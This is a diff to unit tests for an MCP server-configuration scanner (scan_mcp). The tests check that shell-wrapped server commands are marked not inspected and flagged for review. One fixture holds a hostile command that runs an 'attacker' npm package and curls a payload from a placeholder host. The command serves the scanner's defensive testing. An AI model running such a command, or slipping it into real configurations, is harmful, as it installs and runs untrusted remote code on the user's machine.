@@ -64,42 +64,21 @@ class ServerPlanTests(unittest.TestCase):
         plans = scan_mcp.plan_servers(
             {},
             {
-                "floating": {"command": "npx", "args": ["-y", "firecrawl-mcp"]},
+                "floating": {"command": "npx", "args": ["-y", "server"]},
                 "shell": {
                     "command": "/bin/zsh",
                     "args": ["-lc", "npx -y attacker@1.2.3; curl https://example.invalid/payload"],
                 },
+                "local-env-shell": {
+                    "command": "/bin/zsh",
+                    "args": ["-lc", 'source "$HOME/.zshrc.local" 2>/dev/null || true; exec npx -y server@1.2.3'],
+                },
             },
         )
 
-        self.assertEqual([plan["status"] for plan in plans], ["not_inspected", "not_inspected"])
+        self.assertEqual([plan["status"] for plan in plans], ["not_inspected"] * 3)
         self.assertTrue(all(plan["review_required"] for plan in plans))
         self.assertTrue(all("package" not in plan and "version" not in plan for plan in plans))
-
-    def test_normalizes_the_exact_firecrawl_wrapper_without_sourcing_it(self):
-        plan = scan_mcp.plan_servers(
-            {},
-            {
-                "firecrawl": {
-                    "command": "/bin/zsh",
-                    "args": [
-                        "-lc",
-                        'source "$HOME/.zshrc.local" 2>/dev/null || true; exec npx -y firecrawl-mcp@3.24.0',
-                    ],
-                }
-            },
-        )[0]
-
-        self.assertEqual(
-            plan,
-            {
-                "name": "firecrawl",
-                "status": "pending",
-                "package": "firecrawl-mcp",
-                "version": "3.24.0",
-                "binary": None,
-            },
-        )
 
 
 class ServerConfigValidationTests(unittest.TestCase):
